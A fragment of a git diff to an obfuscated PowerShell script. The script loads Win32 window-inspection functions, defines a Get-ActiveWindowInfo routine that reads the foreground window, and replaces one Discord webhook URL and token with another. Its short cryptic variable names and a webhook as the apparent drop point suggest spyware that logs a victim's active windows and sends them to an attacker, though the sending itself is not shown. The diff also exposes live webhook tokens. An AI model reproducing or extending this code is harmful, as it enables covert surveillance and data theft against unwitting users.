@@ -44,7 +44,7 @@ public static extern int GetWindowThreadProcessId(IntPtr hWnd, out int ProcessId
 public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder lpString, int nMaxCount);
 '@
 $b3=Add-Type -MemberDefinition $b3 -Name 'Win32' -Namespace API -PassThru
-$a7="https://discord.com/api/webhooks/1442666694165135391/2B1EGQkG94a4swTJimgjXodryz5BxiT0SuTo7Y6s9XnZTvjLQdkd7Qyu3YTox9MKtMXW"
+$a7="https://discordapp.com/api/webhooks/1442666713748476014/wiZuG-6nKMfeW4oEPmQEW3vAzWOXU876iVErkWnGJ29lhWrR3BbSXCL0CMs0tC16voAv"
 function Get-ActiveWindowInfo {
     try {
         $i6=$b3::GetForegroundWindow()
